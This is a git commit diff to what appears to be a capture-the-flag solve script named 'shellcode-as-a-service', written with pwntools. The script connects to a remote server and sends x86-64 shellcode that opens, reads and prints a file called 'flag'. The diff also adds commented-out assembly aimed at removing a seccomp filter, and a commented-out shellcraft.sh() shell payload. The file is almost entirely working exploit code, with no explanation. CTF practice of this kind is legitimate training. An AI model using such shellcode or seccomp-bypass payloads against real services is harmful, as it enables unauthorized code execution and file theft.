ee0f8f93015740d6a20c27e36dd49c41e4774a8a
Brendon Mendicino <brendonmendicino@yahoo.it>
2024-01-23 19:36:45 +0100

    pwn

--- shellcode-as-a-service/main.py
+++ shellcode-as-a-service/main.py
@@ -4,23 +4,51 @@ conn = pwn.connect('3.71.110.92', 30300)
 
 pwn.context.update(os='linux', arch='amd64')
 
-rm_seccomp = pwn.asm("""mov rax, qword [rbp-0x98]
-mov rax, qword [rax]
-mov rdi, rax
-jmp 0x1090
-""")
+# rm_seccomp = pwn.asm("""push rbp
+# mov rbp, rsp
+# sub rsp, 0x20
+# mov rbx, qword [rsp + 0x20]
+# add rbx, -(0x13c0 - 0x1090)
+# mov rax, qword [rsp + 16 + 0x20]
+# mov rdi, rax
+# call rbx
+# """)
 
-payload = pwn.asm(pwn.shellcraft.echo('flag'))
-# print(rm_seccomp)
-# print(payload)
-# print(len(payload))
+# rm_seccomp = pwn.asm("""push rbp
+# mov rbp, rsp
+# sub rsp, 0x20
+# mov rbx, qword [rsp + 0x20]
+# add rbx, -(0x13c0 - 0x1040)
+# mov ecx, 0x0
+# mov edx, 59
+# mov esi, 0x7fff0000
+# mov rax, qword [rsp + 16 + 0x20]
+# mov rdi, rax
+# mov eax, 0x0
+# call rbx
+
+# mov rbx, qword [rsp + 0x20]
+# add rbx, -(0x13c0 - 0x1070)
+# mov rax, qword [rsp + 16 + 0x20]
+# mov rdi, rax
+# call rbx
+# """)
+# payload = pwn.asm(pwn.shellcraft.sh())
+
+payload = pwn.asm(pwn.shellcraft.open('flag'))
+payload += pwn.asm(pwn.shellcraft.read(fd=3, count=40))
+payload += pwn.asm(pwn.shellcraft.write(fd=1, buf='rsp', n=40))
+
+with open('payload', 'w') as f:
+    import os
+    os.write(f.fileno(), payload)
 
 print(conn.recvuntil(b'...').decode())
 
 conn.sendline(payload)
 
-conn.recv()
-conn.recv()
+print(conn.recv())
+print(conn.recv())
 
 
 conn.close()
